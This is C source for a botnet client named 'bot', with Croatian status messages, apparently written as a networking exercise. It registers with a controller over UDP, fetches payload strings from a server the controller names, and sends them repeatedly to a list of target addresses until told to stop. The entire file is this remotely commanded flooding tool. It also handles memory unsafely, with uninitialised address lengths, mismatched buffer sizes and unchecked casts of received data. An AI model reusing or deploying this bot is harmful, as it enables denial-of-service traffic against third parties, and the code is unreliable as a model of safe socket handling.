#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#define MAXLEN 512

int main(int argc, char *argv[])
{
    char *IPADDR;
    char *PORT;
    bool payload_set = false;
    char *payloads[500];
    char recvmsg[MAXLEN];
    char payloadRecv[1024];
    int payload_count = 0;

    typedef struct {
        char IP[INET_ADDRSTRLEN];
        char PORT[22];
    } ip_port;

    typedef struct {
        char command;
        ip_port pairs[20];
    } MSG;

    if(argv[1] == NULL || argv[2] == NULL || argv[3] != NULL) {
        errx(1, "Usage: ./bot ip port");
    }
    else {
        IPADDR = argv[1];
        PORT = argv[2];
    }

    int mysocket;

    mysocket = socket(PF_INET, SOCK_DGRAM, 0);
    if (mysocket == -1) {
        errx(1, "Neuspjesno stvaranje socketa.");
    }

    int newsock = socket(PF_INET, SOCK_DGRAM, 0);
    if (newsock == -1) {
        errx(1, "Neuspjesno stvaranje socketa.");
    }

    int maxfd = mysocket > newsock ? mysocket : newsock;

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    int error = getaddrinfo(IPADDR, PORT, &hints, &res);
            
    if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

    char *msg = "REG\n";

    ssize_t sent = sendto(mysocket, msg, strlen(msg), 0, res->ai_addr, res->ai_addrlen);
    if(sent == -1) {
        errx(1, "Neuspjesno slanje.");
    }

    freeaddrinfo(res);
    int operation;

    while (1)
    {
        struct sockaddr_in from;
        socklen_t fromaddrlen;

        MSG *m;

        size_t r = recvfrom(mysocket, recvmsg, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
        if(r == -1) {
            errx(1, "Neuspjesno primanje.");
        }
        
        m = (MSG*)recvmsg;
        operation = (int)(m->command - '0');
        if(operation == 0) {
            printf("Izlazim...\n");
            break;
        }
        else if(operation == 1) {
            char *serverPort = m->pairs[0].PORT;
            char *serverIP = m->pairs[0].IP;

            struct sockaddr_in their_addr;
            struct addrinfo hints, *res;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;

            int error = getaddrinfo(serverIP, serverPort, &hints, &res);
            if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

            int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
            if(sock == -1) errx(1, "socket failed");

            their_addr.sin_family = AF_INET;
            their_addr.sin_port = htons(atoi(serverPort));

            their_addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
            memset(their_addr.sin_zero, '\0', sizeof their_addr.sin_zero);

            if (connect(sock,(struct sockaddr *)&their_addr,sizeof their_addr) == -1) {
                err(1,"connect did not succed.");
            }

            freeaddrinfo(res);
            
            char *msgToServer = "HELLO";
            ssize_t sent = send(sock, msgToServer, strlen(msgToServer), 0);
            if(sent == -1) errx(1, "send failed");

            memset(payloadRecv, 0, MAXLEN);
            printf("Primam payload...(tcp)\n");
            r = recv(sock, payloadRecv, MAXLEN, 0);
            if(r == -1) errx(1, "recv failed");
            close(sock);

            payloadRecv[r] = '\0';

            char *token = strtok(payloadRecv, ":");
            int count = 0;
            while(token != NULL) {
                char *t = token;
                payloads[count] = t;
                token = strtok(NULL, ":");
                count++;
            }

            payload_count = count;
            payload_set = true;
        }
        else if(operation == 2) {
            char *serverPort = m->pairs[0].PORT;
            char *serverIP = m->pairs[0].IP;

            struct sockaddr_in their_addr;

            struct addrinfo hints, *res;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_DGRAM;

            int error = getaddrinfo(serverIP, serverPort, &hints, &res);
            if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

            int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
            if(sock == -1) errx(1, "socket failed");

            their_addr.sin_family = AF_INET;
            their_addr.sin_port = htons(atoi(serverPort));

            their_addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
            memset(their_addr.sin_zero, '\0', sizeof their_addr.sin_zero);
            
            char *msgToServer = "HELLO";
            ssize_t sent = sendto(sock, msgToServer, strlen(msgToServer), 0, res->ai_addr, res->ai_addrlen);
            if(sent == -1) errx(1, "send failed");
            
            freeaddrinfo(res);

            memset(payloadRecv, 0, MAXLEN);
            printf("Primam payload...(udp)\n");
            r = recvfrom(sock, payloadRecv, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
            if(r == -1) errx(1, "recv failed");
            close(sock);
            payloadRecv[r] = '\0';

            char *token = strtok(payloadRecv, ":");
            int count = 0;
            while(token != NULL) {
                char *t = token;
                payloads[count] = t;
                token = strtok(NULL, ":");
                count++;
            }
            payload_count = count;
            payload_set = true;
        }
        else if(operation == 3) {

            if(!payload_set) {
                printf("Payload nije postavljen.\n");
                continue;
            }
            memset(&hints, 0, sizeof(hints));
            int numOfTargets = (r - sizeof(char))/((sizeof(char[22])) + INET_ADDRSTRLEN);
            struct addrinfo *targetAddressArrayRES[numOfTargets];

            for(int i = 0; i < numOfTargets; i++) {
                int error = getaddrinfo(m->pairs[i].IP, (char *)&m->pairs[i].PORT, &hints, &targetAddressArrayRES[i]);
                if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));
            };

            fd_set read_fds, write_fds, read_master, write_master;
            FD_ZERO(&read_fds);
            FD_ZERO(&write_fds);
            FD_ZERO(&read_master);
            FD_ZERO(&write_master);
            FD_SET(newsock, &write_master);
            FD_SET(newsock, &read_master);
            FD_SET(mysocket, &read_master);

            FD_SET(mysocket, &read_fds);
            FD_SET(newsock, &read_fds);
            FD_SET(newsock, &write_fds);

            bool exit_flag = false;
            for(int s = 0; s < 100 && !exit_flag; s++) {
                for(int i = 0; i < payload_count && !exit_flag; i++) {
                    for(int j = 0; j < numOfTargets; j++) {

                        read_fds = read_master;
                        write_fds = write_master;

                        if (select(maxfd + 1, &read_fds, &write_fds, NULL, NULL) == -1) {
                            errx(1, "select failed");
                        }
                            
                        if (FD_ISSET(newsock, &read_fds)) {
                            memset(recvmsg, 0, MAXLEN);
                            printf("Citam...1\n");
                            r = recvfrom(newsock, recvmsg, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
                            if(r == -1) errx(1, "recv failed");
                            exit_flag = true;
                            printf("Prekidam slanje poruka\n");
                            break;
                        }
                        if (FD_ISSET(mysocket, &read_fds)) {
                            memset(recvmsg, 0, MAXLEN);
                            printf("Citam...2\n");
                            r = recvfrom(mysocket, recvmsg, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
                            if(r == -1) errx(1, "recv failed");

                            MSG *m = (MSG*)recvmsg;
                            operation = (int)(m->command - '0');
                            
                            if(operation == 4) {
                                exit_flag = true;
                                printf("Prekidam slanje poruka\n");
                                break;
                            }
                            if(operation == 0) {
                                exit(0);
                            }
                        }

                        if (FD_ISSET(newsock, &write_fds)) {
                            ssize_t sent = sendto(newsock, payloads[i], strlen(payloads[i]), 0, targetAddressArrayRES[j]->ai_addr, targetAddressArrayRES[j]->ai_addrlen);
                            if(sent == -1) errx(1, "send failed");
                            printf("Saljem %s na %s:%s\n", payloads[i], m->pairs[j].IP, m->pairs[j].PORT);
                        }
                    }
                }
                sleep(1);
            }
            for(int i = 0; i < numOfTargets; i++) {
                freeaddrinfo(targetAddressArrayRES[i]);
            }
        }
        else if(operation == 4) {
            printf("Bot ne salje poruke\n");
        }
        else {
            errx(1, "Neispravna poruka.");
        }
    }
    return 0;
}